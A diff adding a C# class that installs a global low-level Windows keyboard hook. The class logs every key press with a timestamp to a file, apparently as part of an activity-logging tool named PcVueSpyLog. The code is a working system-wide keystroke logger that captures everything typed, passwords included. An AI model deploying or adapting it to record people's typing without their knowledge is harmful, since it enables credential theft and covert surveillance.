@@ -1,0 +1,113 @@
+﻿using System;
+using System.ComponentModel;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace PcVueSpyLog
+{
+    public class KeyboardHook
+    {
+        [StructLayout(LayoutKind.Sequential)]
+        private class KeyboardHookStruct
+        {
+            /// <summary>
+            /// Key code virtuel, la valeur doit etre entre 1 et 254. 
+            /// </summary>
+            public int vkCode;
+            public int scanCode;
+            public int flags;
+            public int time;
+            public int dwExtraInfo;
+        }
+
+        private static int KeyboardHookId = 0;
+        private static HookImport.HookProc KeyboardHookProcedure;
+
+        public static void StartKeyHook()
+        {
+            KeyboardHookProcedure = new HookImport.HookProc(KeyboardHookProc);
+
+            GC.KeepAlive(KeyboardHookProcedure);
+
+            var mar = HookImport.LoadWin32Library("user32.dll");
+
+            //Installer le hook
+            KeyboardHookId = HookImport.SetWindowsHookEx(
+                ConstsHook.WH_KEYBOARD_LL,
+                KeyboardHookProcedure,
+                mar,
+                0);
+            //Si SetWindowsHookEx echoue
+            if (KeyboardHookId == 0)
+            {
+                int errorCode = Marshal.GetLastWin32Error();
+                throw new Win32Exception(errorCode);
+            }
+        }
+
+        public static void StopKeyHook()
+        {
+            KeyboardHookProcedure = null;
+            HookImport.UnhookWindowsHookEx(KeyboardHookId);
+        }
+
+        /// <summary>
+        /// lorsque l'on appui sur une touche du clavier écrit le log
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        public static void OnKeyDown(object sender, KeyEventArgs e)
+        {
+            // Touche appuyée
+            if (!String.IsNullOrWhiteSpace(ComputerInfos.InstallFolderBin))
+            {
+                try
+                {
+                    string line = "[" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss:ff0") + "];" + ConstsType.CLAVIER + ";" + e.KeyData + ";\r\n";
+                    ChoseFile.ChoseFileLog(DateTime.Now, line);
+                }
+                catch(Exception err) { }
+            }
+        }
+
+        public static void OnKeyUp(object sender, KeyEventArgs e)
+        {
+            // Touche relachée
+        }
+
+        private static int KeyboardHookProc(int nCode, Int32 wParam, IntPtr lParam)
+        {
+            bool handled = false;
+            //On verifie si tous est ok
+            if (nCode >= 0)
+            {
+                //Remplissage de la structure KeyboardHookStruct a partir d'un pointeur
+                KeyboardHookStruct MyKeyboardHookStruct = (KeyboardHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyboardHookStruct));
+                //KeyDown
+                if (wParam == ConstsHook.WM_KEYDOWN || wParam == ConstsHook.WM_SYSKEYDOWN)
+                {
+                    Keys keyData = (Keys)MyKeyboardHookStruct.vkCode;
+                    KeyEventArgs e = new KeyEventArgs(keyData);
+                    OnKeyDown(null, e);
+                    handled = handled || e.Handled;
+                }
+
+                // KeyUp
+                if (wParam == ConstsHook.WM_KEYUP || wParam == ConstsHook.WM_SYSKEYUP)
+                {
+                    Keys keyData = (Keys)MyKeyboardHookStruct.vkCode;
+                    KeyEventArgs e = new KeyEventArgs(keyData);
+                    OnKeyUp(null, e);
+                    handled = handled || e.Handled;
+                }
+
+            }
+
+            // si handled est a true, on ne transmet pas le message au destinataire
+            if (handled)
+                return 1;
+            else
+                return HookImport.CallNextHookEx(KeyboardHookId, nCode, wParam, lParam);
+        }
+    }
+}
